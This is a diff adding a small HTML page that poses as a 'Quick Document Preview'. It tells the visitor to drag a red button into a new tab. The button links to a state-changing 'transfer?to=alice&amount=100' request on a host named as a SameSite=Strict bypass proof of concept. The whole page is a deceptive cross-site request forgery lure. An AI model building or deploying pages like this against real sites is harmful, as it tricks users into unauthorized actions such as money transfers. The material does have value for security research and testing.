@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Quick Document Preview</title>
+
+<style>
+
+body{
+    font-family: Arial, sans-serif;
+    text-align:center;
+    background:#f4f4f4;
+}
+
+.container{
+    margin-top:80px;
+}
+
+#draglink{
+    display:inline-block;
+    padding:15px 25px;
+    background:#e74c3c;
+    color:white;
+    font-size:18px;
+    text-decoration:none;
+    border-radius:8px;
+    cursor:grab;
+}
+
+
+.instructions{
+    margin-top:20px;
+    color:#7c0a02;
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+<h2>Preview the document</h2>
+
+<p class="instructions">
+To view the document preview, please drag the button below into the new tab.
+</p>
+
+<a id="draglink"
+   href="https://poc-bypass-samesite-strict.vercel.app/transfer?to=alice&amount=100"
+   draggable="true">
+   Drag this preview link
+</a>
+
+
+</body>
+</html>
